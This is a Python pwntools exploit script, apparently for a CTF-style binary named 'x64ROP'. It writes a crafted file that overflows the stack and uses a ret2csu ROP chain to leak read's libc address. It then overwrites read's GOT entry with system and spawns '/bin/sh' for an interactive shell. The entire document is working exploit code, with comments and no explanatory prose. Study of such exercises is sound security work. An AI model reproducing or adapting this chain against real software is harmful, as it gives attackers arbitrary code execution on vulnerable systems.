from os import access
from pwn import *

e = ELF("./x64ROP")
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') # ubuntu 20.04 ver
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ubuntu 18.04 ver

MAGIC_ID = 0xffe4
FILE_TYPE_RAWTEXT = 1

read_plt = e.plt['read']
read_got = e.got['read']

# gadgets
pop_rdi = 0x0000000000400b53
ret = 0x004005a6

print_usage = 0x400737

pop6ret_csu = 0x400b4a # pop rbx rbp r12 r13 r14 r15 ret
mov3call_csu = 0x400b30 # mov rdx, r15 mov rsi, r14, mov edi, r13d [call r12+rbx*8]

bss = 0x00601260

# payload
payload  = p32(0xe4ff)
payload += p32(128)
payload += p32(FILE_TYPE_RAWTEXT)
payload += p32(512)
payload += b'A'*0xc0 + b'B'*0x8

# print_usage(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(ret) # becuase of movaps
payload += p64(print_usage)

# read(0, bss, 0x50) <- /bin/sh
payload += p64(pop6ret_csu)
payload += p64(0) + p64(1) + p64(read_got) # rbx rbp r12
payload += p64(0) + p64(bss) + p64(0x8) # r13(edi), r14(rsi), r15(rdx)
payload += p64(mov3call_csu)

# read(0, read_got, 0x50) <- system
payload += b'A'*0x8
payload += p64(0) + p64(1) + p64(read_got) # rbx rbp r12
payload += p64(0) + p64(read_got) + p64(0x8) # r13(edi), r14(rsi), r15(rdx)
payload += p64(mov3call_csu)

# read("/bin/sh") == system("/bin/sh")
payload += b'A'*0x8
payload += p64(0) + p64(1) + p64(read_got) # rbx rbp r12
payload += p64(bss) + p64(0) + p64(0) # r13(edi), r14(rsi), r15(rdx)
payload += p64(ret) # becuase of movaps
payload += p64(mov3call_csu)

with open('payload', 'wb') as f:
    f.write(payload)

# Exploit
p = process(["./x64ROP", "payload"],)

p.recvuntil('failed.\n')

read_addr = p.recv(6) + b'\x00'*2
read_addr = u64(read_addr)

libc_base = read_addr - libc.symbols['read']
system = libc.symbols['system'] + libc_base

print('read_got: ', end='')
print(hex(read_got))

print('read: ', end='')
print(hex(read_addr))

print('system: ', end='')
print(hex(system))

p.send(b"/bin/sh\x00")

p.send(p64(system))

print('\npwned!')
p.recv()

p.interactive()